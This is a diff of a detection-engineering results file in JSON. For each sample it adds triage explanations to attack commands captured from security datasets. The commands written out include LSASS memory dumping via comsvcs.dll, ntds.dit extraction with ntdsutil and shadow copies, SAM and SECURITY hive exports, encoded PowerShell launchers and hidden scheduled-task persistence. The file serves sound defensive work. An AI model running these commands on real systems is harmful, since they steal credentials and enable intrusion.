@@ -1,5 +1,5 @@
 {
- "run_utc": "2026-11-24 11:02 UTC",
+ "run_utc": "2026-11-24 11:06 UTC",
  "engine": "Kustainer (Azure Data Explorer emulator)",
  "captures": {
   "cmd_bitsadmin_download_psh_script": {
@@ -481,6 +481,7 @@
    "sample": [
     {
      "what": "bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\wardog\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+     "why": "ACTION: CRITICAL ingress via native transfer utility | CONTEXT: External transfer intent (HasNet=True, Flags=True) | PIVOT: confirm destination URL/IP, identify written file (Temp/Public/Downloads), check immediate child",
      "by": "cmd.exe",
      "score": "100"
     }
@@ -914,9 +915,13 @@
    "rows": 2,
    "sample": [
     {
+     "what": "['\"c:\\\\windows\\\\system32\\\\rundll32.exe\" c:\\\\windows\\\\system32\\\\comsvcs.dll minidump 756 c:\\\\users\\\\wardog\\\\appdata\\\\local\\\\temp\\\\lsass-comsvcs.dmp full']",
+     "why": "['ACTION: CRITICAL LSASS Credential Theft Alert on WORKSTATION5', 'CONTEXT: Techniques Observed: [\"LOLBin_Comsvcs\"]', 'EVIDENCE: [\"\\\\\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\rundll32.exe\\\\\" c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\comsvcs.dll ",
      "score": "110"
     },
     {
+     "what": "['Access by: rundll32.exe', 'c:\\\\users\\\\wardog\\\\appdata\\\\local\\\\temp\\\\lsass-comsvcs.dmp\\\\lsass-comsvcs.dmp']",
+     "why": "['ACTION: MEDIUM LSASS Credential Theft Alert on WORKSTATION5', 'CONTEXT: Techniques Observed: [\"Direct_Memory_Access\",\"LSASS_Dump_File\"]', 'EVIDENCE: [\"Access by: rundll32.exe\",\"c:\\\\\\\\users\\\\\\\\wardog\\\\\\\\appdata\\\\\\\\local",
      "score": "65"
     }
    ]
@@ -960,6 +965,8 @@
    "rows": 1,
    "sample": [
     {
+     "what": "['ntdsutil  \"ac i ntds\" \"ifm\" \"create full c:\\\\windows\\\\temp\\\\ntds_t1003\" q q', 'FileCreated: C:\\\\Windows\\\\Temp\\\\ntds_T1003\\\\Active Directory\\\\ntds.dit', 'FileCreated: C:\\\\Windows\\\\Temp\\\\ntds_T1003\\\\registry\\\\SYSTEM', 'F",
+     "why": "CRITICAL: ntdsutil.exe used to Create Full Media (IFM). Active Directory DB extracted. Trigger AD Compromise Plan.",
      "score": "170"
     }
    ]
@@ -977,6 +984,8 @@
    "rows": 1,
    "sample": [
     {
+     "what": "['FileCreated: C:\\\\Windows\\\\Temp\\\\ntds.dit', 'vssadmin.exe  create shadow /for=c:', 'reg  save hklm\\\\system c:\\\\windows\\\\temp\\\\system_hive']",
+     "why": "CRITICAL: Volume Shadow Copy created AND ntds.dit accessed. Precursor to offline hash cracking.",
      "score": "150"
     }
    ]
@@ -994,6 +1003,8 @@
    "rows": 1,
    "sample": [
     {
+     "what": "['\"reg\" save hklm\\\\security\\\\policy\\\\secrets c:\\\\users\\\\wardog\\\\appdata\\\\local\\\\temp\\\\secrets']",
+     "why": "HIGH: SAM/SYSTEM Registry Hives exported. Local Admin/Domain credential theft likely.",
      "score": "60"
     }
    ]
@@ -1114,6 +1125,8 @@
    "rows": 1,
    "sample": [
     {
+     "what": "['\"c:\\\\windows\\\\system32\\\\reg.exe\" save hklm\\\\sam sam']",
+     "why": "HIGH: SAM/SYSTEM Registry Hives exported. Local Admin/Domain credential theft likely.",
      "score": "60"
     }
    ]
@@ -1680,6 +1693,8 @@
    "rows": 1,
    "sample": [
     {
+     "what": "['C:\\\\windows\\\\PSEXESVC.exe']",
+     "why": "ACTION: MEDIUM suspected SMB/service lateral movement | CONTEXT: Medium (SMB/RPC + Service) | Sources=[\"fe80:0:0:0:90e:17af:263c:5209\"] Ports=[445] | ServiceProcs=[\"PSEXESVC.exe\"] | PIVOT: On target host, inspect service",
      "score": "55"
     }
    ]
@@ -1761,6 +1776,8 @@
    "rows": 1,
    "sample": [
     {
+     "what": "['C:\\\\windows\\\\system32\\\\cmd.exe /C start /b C:\\\\Windows\\\\System32\\\\WindowsPowershell\\\\v1.0\\\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0",
+     "why": "ACTION: HIGH suspected SMB/service lateral movement | CONTEXT: High (SMB/RPC + Service + Staging) | Sources=[\"172.18.39.5\"] Ports=[135] | ServiceProcs=[\"cmd.exe\"] | PIVOT: On target host, inspect service install artifact",
      "score": "80"
     }
    ]
@@ -1817,6 +1834,8 @@
    "rows": 1,
    "sample": [
     {
+     "what": "['C:\\\\windows\\\\system32\\\\cmd.exe /C \"C:\\\\windows\\\\system32\\\\cmd.exe /C start /b C:\\\\Windows\\\\System32\\\\WindowsPowershell\\\\v1.0\\\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAFIAcwBpAG8ATgBUAGEAQgBMAEUALgBQAFMAVgBF",
+     "why": "ACTION: HIGH suspected SMB/service lateral movement | CONTEXT: High (SMB/RPC + Service + Staging) | Sources=[\"172.18.39.5\"] Ports=[445] | ServiceProcs=[\"cmd.exe\"] | PIVOT: On target host, inspect service install artifact",
      "score": "80"
     }
    ]
@@ -2092,6 +2111,7 @@
    "sample": [
     {
      "what": "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
+     "why": "MEDIUM: LSA-related change. Validate against baseline and change approvals.",
      "score": "90"
     }
    ]
@@ -2199,14 +2219,17 @@
    "sample": [
     {
      "what": "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Cyb3rWard0g",
+     "why": "HIGH: Background persistence registry artifact. Pivot to writer ancestry, recent file drops, hunt fleet for same RegistryValueData / WriterSHA.",
      "score": "95"
     },
     {
      "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{FA103B2E-5EB2-499F-9443-9765F29C7B5B}",
+     "why": "HIGH: Background persistence registry artifact. Pivot to writer ancestry, recent file drops, hunt fleet for same RegistryValueData / WriterSHA.",
      "score": "90"
     },
     {
      "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{A1A4F90B-9598-45B7-85D2-AE21B341085D}",
+     "why": "HIGH: Background persistence registry artifact. Pivot to writer ancestry, recent file drops, hunt fleet for same RegistryValueData / WriterSHA.",
      "score": "90"
     }
    ]
@@ -2276,14 +2299,17 @@
    "sample": [
     {
      "what": "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Updater",
+     "why": "CRITICAL: Service persistence set (ImagePath). Validate service name + binary, check signer, collect binary, scope other hosts for same ImagePath.",
      "score": "135"
     },
     {
      "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{BCE37B91-785E-47AE-B422-F03C44349FEC}",
+     "why": "HIGH: Background persistence registry artifact. Pivot to writer ancestry, recent file drops, hunt fleet for same RegistryValueData / WriterSHA.",
      "score": "90"
     },
     {
      "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{BCE37B91-785E-47AE-B422-F03C44349FEC}",
+     "why": "HIGH: Background persistence registry artifact. Pivot to writer ancestry, recent file drops, hunt fleet for same RegistryValueData / WriterSHA.",
      "score": "90"
     }
    ]
@@ -2302,14 +2328,17 @@
    "sample": [
     {
      "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start",
+     "why": "HIGH: Background persistence registry artifact. Pivot to writer ancestry, recent file drops, hunt fleet for same RegistryValueData / WriterSHA.",
      "score": "90"
     },
     {
      "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
+     "why": "HIGH: Background persistence registry artifact. Pivot to writer ancestry, recent file drops, hunt fleet for same RegistryValueData / WriterSHA.",
      "score": "90"
     },
     {
      "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{FA103B2E-5EB2-499F-9443-9765F29C7B5B}",
+     "why": "HIGH: Background persistence registry artifact. Pivot to writer ancestry, recent file drops, hunt fleet for same RegistryValueData / WriterSHA.",
      "score": "90"
     }
    ]
@@ -2536,6 +2565,7 @@
    "sample": [
     {
      "what": "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /RU system /SC ONLOGON /TN MordorElevated /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert",
+     "why": "['[MIN_TRUTH] schtasks.exe /create executed (task created/modified).', '[TASK] TaskName=MordorElevated | RunAs=system | Schedule=ONLOGON', '[ACTION] Category=Task_ScriptEngine_Action | XML=0 | XmlFromWritable=0 | UsesWri",
      "by": "powershell.exe",
      "score": "110"
     }
@@ -2553,6 +2583,7 @@
    "sample": [
     {
      "what": "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN MordorSchtask /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::F",
+     "why": "['[MIN_TRUTH] schtasks.exe /create executed (task created/modified).', '[TASK] TaskName=MordorSchtask | RunAs=<unknown> | Schedule=DAILY', '[ACTION] Category=Task_ScriptEngine_Action | XML=0 | XmlFromWritable=0 | UsesWri",
      "by": "powershell.exe",
      "score": "80"
     }
@@ -2635,6 +2666,7 @@
    "sample": [
     {
      "what": "schtasks  /create /F /tn \\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager /tr \"C:\\Windows\\system32\\cmd.exe /C C:\\Windows\\System32\\notepad.exe\" /sc ONSTART /ru system /S WORKSTATION6",
+     "why": "['[MIN_TRUTH] schtasks.exe /create executed (task created/modified).', '[TASK] TaskName=\\\\Microsoft\\\\Windows\\\\SoftwareProtectionPlatform\\\\EventCacheManager | RunAs=system | Schedule=ONSTART', '[ACTION] Category=Task_Scri",
      "by": "cmd.exe",
      "score": "110"
     }
@@ -2708,6 +2740,8 @@
    "rows": 1,
    "sample": [
     {
+     "what": "['scrcons loaded vbscript.dll from C:\\\\Windows\\\\System32\\\\vbscript.dll']",
+     "why": "HIGH: scrcons loaded script engine and made near-time HTTP/HTTPS. Investigate RemoteUrl/RemoteIP; check for repeat beaconing; validate WMI subscription artifacts.",
      "score": "HIGH"
     }
    ]
@@ -3061,6 +3095,7 @@
    "sample": [
     {
      "what": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAG8ATgBUAEEAQgBsAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAA0ADMAZABlADIAPQBbAHIAZQBGAF0AL",
+     "why": "CRITICAL: wmiprvse spawned process + immediate network beacon. Highly likely WMI Lateral Movement.",
      "score": "CRITICAL"
     }
    ]
